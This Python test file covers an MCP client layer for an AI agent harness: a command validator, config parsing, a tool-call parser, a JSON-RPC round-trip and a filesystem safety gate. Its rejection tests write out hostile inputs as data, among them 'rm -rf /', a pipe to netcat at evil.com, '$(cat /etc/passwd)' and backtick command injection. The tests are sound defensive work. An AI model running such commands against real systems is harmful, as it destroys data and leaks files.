"""Regression tests for the MCP client slice.

Covers:
    - ``trust.validate_mcp_server_command`` — allowlist + hard-deny +
      shell-metacharacter scan + absolute-path guard.
    - ``McpPoolConfig.from_config`` — parses the shipped config shape
      correctly; defaults are sane.
    - ``parse_mcp_blocks`` extracts ``<<<MCP_CALL>>>`` blocks, returns
      a ``ParsedToolBlock`` with the right ``mcp__<server>__<tool>``
      name and JSON-decoded args; malformed args don't raise.
    - ``StdioMcpClient`` JSON-RPC round-trip (initialize → tools/list
      → tools/call → shutdown) against an in-memory fake transport.
    - ``McpClientPool.start`` registers each tool; ``shutdown`` is
      idempotent.
    - The filesystem-server safety gate blocks startup unless the
      operator opted in.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest

from harness.mcp_client import (
    McpClientPool,
    McpError,
    McpPoolConfig,
    McpServerConfig,
    McpToolSkill,
    StdioMcpClient,
    parse_mcp_blocks,
    register_mcp_skills,
    strip_mcp_blocks,
)
from harness.skills import SkillRegistry
from harness.trust import validate_mcp_server_command


# ---------------------------------------------------------------------------
# 1. Command allowlist
# ---------------------------------------------------------------------------

def test_validate_mcp_server_command_accepts_npx():
    cmd = ["npx", "-y", "@modelcontextprotocol/server-time"]
    assert validate_mcp_server_command(cmd) == cmd


def test_validate_mcp_server_command_accepts_python_module():
    cmd = ["python3", "-m", "my_mcp_server"]
    assert validate_mcp_server_command(cmd) == cmd


@pytest.mark.parametrize("cmd", [
    ["sudo", "npx", "-y", "x"],
    ["bash", "-c", "evil"],
    ["sh", "-c", "evil"],
    ["/bin/sh"],
    ["rm", "-rf", "/"],
])
def test_validate_mcp_server_command_rejects_hard_deny(cmd):
    with pytest.raises(ValueError):
        validate_mcp_server_command(cmd)


def test_validate_mcp_server_command_rejects_unknown_binary():
    with pytest.raises(ValueError):
        validate_mcp_server_command(["mystery_binary", "x"])


def test_validate_mcp_server_command_extra_allowlist_admits_binary():
    cmd = ["my_internal_mcp", "--port", "9000"]
    # Default reject.
    with pytest.raises(ValueError):
        validate_mcp_server_command(cmd)
    # Extra-allowlisted: accepted.
    assert validate_mcp_server_command(
        cmd, extra_allowlist=["my_internal_mcp"],
    ) == cmd


@pytest.mark.parametrize("cmd", [
    ["npx", "y; rm -rf /"],
    ["npx", "y | nc evil.com 4444"],
    ["npx", "y && evil"],
    ["npx", "y$(cat /etc/passwd)"],
    ["npx", "`whoami`"],
])
def test_validate_mcp_server_command_blocks_shell_metacharacters(cmd):
    with pytest.raises(ValueError):
        validate_mcp_server_command(cmd)


def test_validate_mcp_server_command_blocks_etc_path():
    with pytest.raises(ValueError):
        validate_mcp_server_command(["/etc/something"])


def test_validate_mcp_server_command_rejects_empty():
    with pytest.raises(ValueError):
        validate_mcp_server_command([])
    with pytest.raises(ValueError):
        validate_mcp_server_command([""])


# ---------------------------------------------------------------------------
# 2. Config dataclass
# ---------------------------------------------------------------------------

def test_mcp_pool_config_from_dict_parses_servers():
    cfg = McpPoolConfig.from_config({
        "mcp": {
            "enabled": True,
            "tool_call_timeout_seconds": 45,
            "command_allowlist": ["my_bin"],
            "result_max_bytes": 1024,
            "servers": [
                {
                    "name": "time",
                    "transport": "stdio",
                    "command": ["npx", "-y", "@modelcontextprotocol/server-time"],
                    "env": {"FOO": "bar"},
                    "api_key_env": "TIME_KEY",
                },
            ],
        },
    })
    assert cfg.enabled is True
    assert cfg.tool_call_timeout_seconds == 45.0
    assert cfg.command_allowlist == ["my_bin"]
    assert cfg.result_max_bytes == 1024
    assert len(cfg.servers) == 1
    server = cfg.servers[0]
    assert server.name == "time"
    assert server.transport == "stdio"
    assert server.command == ["npx", "-y", "@modelcontextprotocol/server-time"]
    assert server.env == {"FOO": "bar"}
    assert server.api_key_env == "TIME_KEY"


def test_mcp_pool_config_disabled_by_default():
    cfg = McpPoolConfig.from_config({})
    assert cfg.enabled is False
    assert cfg.servers == []


# ---------------------------------------------------------------------------
# 3. DSL parser
# ---------------------------------------------------------------------------

def test_parse_mcp_blocks_extracts_server_tool_and_args():
    content = (
        'Pre-text.\n'
        '<<<MCP_CALL server="github" tool="get_issue" args=\'{"owner":"x","repo":"y","number":42}\'>>>\n'
        'Then a second:\n'
        '<<<MCP_CALL server="time" tool="get_current_time" args=\'{}\'>>>\n'
        'Tail.'
    )
    blocks = parse_mcp_blocks(content)
    assert len(blocks) == 2
    assert blocks[0].skill_name == "mcp__github__get_issue"
    assert blocks[0].kwargs == {"owner": "x", "repo": "y", "number": 42}
    assert blocks[1].skill_name == "mcp__time__get_current_time"
    assert blocks[1].kwargs == {}


def test_parse_mcp_blocks_handles_malformed_args_without_raising():
    content = '<<<MCP_CALL server="x" tool="y" args=\'not-json\'>>>'
    blocks = parse_mcp_blocks(content)
    assert len(blocks) == 1
    assert "_parse_error" in blocks[0].kwargs
    assert blocks[0].kwargs["_raw_args"] == "not-json"


def test_parse_mcp_blocks_returns_empty_when_no_blocks():
    assert parse_mcp_blocks("nothing here") == []
    assert parse_mcp_blocks(None) == []  # type: ignore[arg-type]


def test_strip_mcp_blocks_removes_blocks():
    content = (
        'Head.\n'
        '<<<MCP_CALL server="x" tool="y" args=\'{}\'>>>\n'
        'Tail.'
    )
    stripped = strip_mcp_blocks(content)
    assert "<<<" not in stripped
    assert "Head." in stripped
    assert "Tail." in stripped


# ---------------------------------------------------------------------------
# 4. StdioMcpClient — round-trip against an in-memory transport
# ---------------------------------------------------------------------------

class _FakeProcStdin:
    """Captures what the client writes; offers it to the test."""

    def __init__(self) -> None:
        self.buffer: list[bytes] = []
        self._closed = False

    def write(self, data: bytes) -> None:
        if self._closed:
            return
        self.buffer.append(data)

    async def drain(self) -> None:
        return None

    def close(self) -> None:
        self._closed = True


class _FakeProcStdout:
    """Hands the client a scripted sequence of newline-delimited
    JSON-RPC frames in response to writes on the partner stdin."""

    def __init__(self) -> None:
        self._lines: list[bytes] = []
        self._cond = asyncio.Condition()
        self._eof = False

    async def readline(self) -> bytes:
        async with self._cond:
            while not self._lines and not self._eof:
                await self._cond.wait()
            if self._lines:
                return self._lines.pop(0)
            return b""

    async def readuntil(self, separator: bytes = b"\n") -> bytes:
        """Mimic asyncio.StreamReader.readuntil; the real MCP client now
        uses readuntil so it can bound a single-line read with
        LimitOverrunError (audit §4.9). The fake stream just delegates to
        readline since each pushed message already ends in ``\\n``."""
        line = await self.readline()
        if not line:
            # asyncio.StreamReader raises IncompleteReadError on EOF;
            # match that contract.
            raise asyncio.IncompleteReadError(b"", None)
        return line

    async def push(self, msg: dict[str, Any]) -> None:
        async with self._cond:
            self._lines.append((json.dumps(msg) + "\n").encode("utf-8"))
            self._cond.notify_all()

    async def signal_eof(self) -> None:
        async with self._cond:
            self._eof = True
            self._cond.notify_all()


class _FakeProc:
    """Stands in for ``asyncio.subprocess.Process`` for the unit test."""

    def __init__(self) -> None:
        self.stdin = _FakeProcStdin()
        self.stdout = _FakeProcStdout()
        self.stderr = _FakeProcStdout()
        self.returncode: int | None = None
        self.pid = 99999

    def terminate(self) -> None:
        self.returncode = 0

    def kill(self) -> None:
        self.returncode = -9

    async def wait(self) -> int:
        if self.returncode is None:
            self.returncode = 0
        return self.returncode


async def _run_client_with_scripted_server(
    *,
    tools: list[dict[str, Any]],
    tool_call_result: dict[str, Any],
    server_name: str = "stub",
) -> tuple[StdioMcpClient, _FakeProc]:
    """Wire up a StdioMcpClient against a fake subprocess that scripts the
    initialize / tools/list / tools/call responses. Returns (client,
    fake proc) so the caller can drive it and assert."""
    fake = _FakeProc()
    config = McpServerConfig(
        name=server_name, command=["npx", "-y", "@scoped/server"],
    )
    client = StdioMcpClient(config, timeout_seconds=2.0)
    client._proc = fake  # type: ignore[assignment]
    client._reader_task = asyncio.create_task(client._read_loop())
    client._stderr_task = asyncio.create_task(client._stderr_loop())

    async def server_loop():
        # Wait for and respond to: initialize → notifications/initialized
        # → tools/list → tools/call (one round-trip)
        async def wait_for_request_id() -> tuple[int, str]:
            while True:
                if fake.stdin.buffer:
                    raw = fake.stdin.buffer.pop(0)
                    msg = json.loads(raw.decode("utf-8"))
                    if "id" in msg:
                        return msg["id"], msg.get("method", "")
                    # notifications/initialized has no id — skip
                await asyncio.sleep(0.005)

        # initialize
        init_id, init_method = await wait_for_request_id()
        assert init_method == "initialize"
        await fake.stdout.push({
            "jsonrpc": "2.0", "id": init_id,
            "result": {"protocolVersion": "2024-11-05",
                       "serverInfo": {"name": "stub", "version": "0.1"}},
        })
        # tools/list
        list_id, list_method = await wait_for_request_id()
        assert list_method == "tools/list"
        await fake.stdout.push({
            "jsonrpc": "2.0", "id": list_id,
            "result": {"tools": tools},
        })
        # tools/call (driven by the test once we return)
        call_id, call_method = await wait_for_request_id()
        assert call_method == "tools/call"
        await fake.stdout.push({
            "jsonrpc": "2.0", "id": call_id,
            "result": tool_call_result,
        })

    server_task = asyncio.create_task(server_loop())
    await client.start()
    # Wait briefly for server_task to be ready to handle call_tool —
    # call_tool below will trigger its remaining branch.
    client._server_task = server_task  # type: ignore[attr-defined]
    return client, fake


@pytest.mark.asyncio
async def test_stdio_client_roundtrip_call_tool():
    tools = [
        {
            "name": "echo",
            "description": "echo back",
            "inputSchema": {"type": "object", "properties": {"msg": {"type": "string"}}},
        },
    ]
    call_result = {"content": [{"type": "text", "text": "echoed: hi"}], "isError": False}
    client, fake = await _run_client_with_scripted_server(
        tools=tools, tool_call_result=call_result,
    )
    try:
        assert client.tools == tools
        result = await client.call_tool("echo", {"msg": "hi"})
        assert result == call_result
    finally:
        # Let the server task finish handling the call request.
        await asyncio.sleep(0.05)
        await client.shutdown()
        await fake.stdout.signal_eof()


@pytest.mark.asyncio
async def test_stdio_client_timeout_raises_mcperror(monkeypatch):
    fake = _FakeProc()
    config = McpServerConfig(name="t", command=["npx", "-y", "@x/server"])
    client = StdioMcpClient(config, timeout_seconds=0.1)
    client._proc = fake  # type: ignore[assignment]
    client._reader_task = asyncio.create_task(client._read_loop())
    client._stderr_task = asyncio.create_task(client._stderr_loop())
    # Never push a response — initialize will time out.
    with pytest.raises(McpError):
        await client.start()
    await client.shutdown()


# ---------------------------------------------------------------------------
# 5. McpToolSkill + register_mcp_skills
# ---------------------------------------------------------------------------

class _DummyPool:
    """Stand-in pool for the skill-registration test."""

    def __init__(self, tools_per_server: dict[str, list[dict[str, Any]]]):
        self._tools = tools_per_server
        self.calls: list[tuple[str, str, dict[str, Any]]] = []

    def list_all_tools(self) -> dict[str, list[dict[str, Any]]]:
        return self._tools

    async def call_tool(
        self, server: str, tool: str, args: dict[str, Any],
    ) -> dict[str, Any]:
        self.calls.append((server, tool, args))
        return {"result": "ok", "tool": tool, "args": args}


def _drop_mcp_skills(prefix: str = "mcp__") -> None:
    reg = SkillRegistry()
    for name in list(reg._skills.keys()):  # type: ignore[attr-defined]
        if name.startswith(prefix):
            reg._skills.pop(name, None)  # type: ignore[attr-defined]


def test_register_mcp_skills_registers_one_per_tool():
    _drop_mcp_skills()
    pool = _DummyPool({
        "time": [{"name": "now", "description": "current time"}],
        "github": [
            {"name": "get_issue", "description": "fetch an issue"},
            {"name": "create_issue", "description": "open an issue"},
        ],
    })
    count = register_mcp_skills(pool)  # type: ignore[arg-type]
    assert count == 3
    reg = SkillRegistry()
    assert reg.get("mcp__time__now") is not None
    assert reg.get("mcp__github__get_issue") is not None
    assert reg.get("mcp__github__create_issue") is not None
    _drop_mcp_skills()


@pytest.mark.asyncio
async def test_mcp_tool_skill_dispatches_via_pool():
    _drop_mcp_skills()
    pool = _DummyPool({"x": [{"name": "do", "inputSchema": {"type": "object"}}]})
    register_mcp_skills(pool)  # type: ignore[arg-type]
    reg = SkillRegistry()
    skill = reg.get("mcp__x__do")
    assert isinstance(skill, McpToolSkill)
    result = await skill.execute(a=1, b="two")
    assert result["tool"] == "do"
    assert result["args"] == {"a": 1, "b": "two"}
    assert pool.calls == [("x", "do", {"a": 1, "b": "two"})]
    _drop_mcp_skills()


class _TaggedDummyPool(_DummyPool):
    """``_DummyPool`` variant that exposes a ``config`` with per-server tags
    so ``register_mcp_skills(workspace_tags=...)`` has something to filter on.
    """

    def __init__(
        self,
        tools_per_server: dict[str, list[dict[str, Any]]],
        server_tags: dict[str, list[str]],
    ):
        super().__init__(tools_per_server)
        from harness.mcp_client import McpPoolConfig, McpServerConfig
        self.config = McpPoolConfig(
            enabled=True,
            servers=[
                McpServerConfig(name=name, command=["echo"], tags=server_tags.get(name, []))
                for name in tools_per_server
            ],
        )


def test_register_mcp_skills_filters_by_workspace_tags():
    _drop_mcp_skills()
    pool = _TaggedDummyPool(
        tools_per_server={
            "py-helper": [{"name": "lint"}],
            "node-helper": [{"name": "lint"}],
            "universal": [{"name": "search"}],
        },
        server_tags={
            "py-helper": ["python"],
            "node-helper": ["node", "javascript"],
            "universal": [],  # no tags → always included
        },
    )
    count = register_mcp_skills(pool, workspace_tags={"python"})  # type: ignore[arg-type]
    # py-helper + universal register; node-helper is dropped.
    assert count == 2
    reg = SkillRegistry()
    assert reg.get("mcp__py-helper__lint") is not None
    assert reg.get("mcp__universal__search") is not None
    assert reg.get("mcp__node-helper__lint") is None
    _drop_mcp_skills()


def test_register_mcp_skills_no_workspace_tags_means_no_filtering():
    _drop_mcp_skills()
    pool = _TaggedDummyPool(
        tools_per_server={
            "py-helper": [{"name": "lint"}],
            "node-helper": [{"name": "lint"}],
        },
        server_tags={
            "py-helper": ["python"],
            "node-helper": ["node"],
        },
    )
    # workspace_tags=None → register everything regardless of declared tags.
    count = register_mcp_skills(pool, workspace_tags=None)  # type: ignore[arg-type]
    assert count == 2
    _drop_mcp_skills()


# ---------------------------------------------------------------------------
# 6. Filesystem-server safety gate
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_filesystem_server_blocked_by_default():
    cfg = McpPoolConfig.from_config({
        "mcp": {
            "enabled": True,
            "allow_local_filesystem_servers": False,
            "servers": [
                {
                    "name": "fs",
                    "transport": "stdio",
                    "command": ["npx", "-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
                },
            ],
        },
    })
    pool = McpClientPool(cfg)
    with pytest.raises(ValueError, match="filesystem"):
        await pool.start()


@pytest.mark.asyncio
async def test_filesystem_server_allowed_when_opted_in():
    """When the operator opts in, the safety gate doesn't fire. The
    actual subprocess start will fail (the binary may not exist on the
    test host), and that failure is *logged*, not raised — confirming
    one bad server doesn't take down the pool."""
    cfg = McpPoolConfig.from_config({
        "mcp": {
            "enabled": True,
            "allow_local_filesystem_servers": True,
            "servers": [
                {
                    "name": "fs",
                    "transport": "stdio",
                    "command": ["python3", "-c", "import sys; sys.exit(1)"],
                },
            ],
        },
    })
    pool = McpClientPool(cfg)
    # Should not raise — start failures are logged + skipped.
    await pool.start()
    assert "fs" not in pool.clients  # failed to register
    await pool.shutdown()


# ---------------------------------------------------------------------------
# 7. Pool shutdown is idempotent
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_pool_shutdown_idempotent_when_empty():
    pool = McpClientPool(McpPoolConfig.from_config({}))
    await pool.shutdown()  # no clients — must not raise
    await pool.shutdown()  # call again — still must not raise
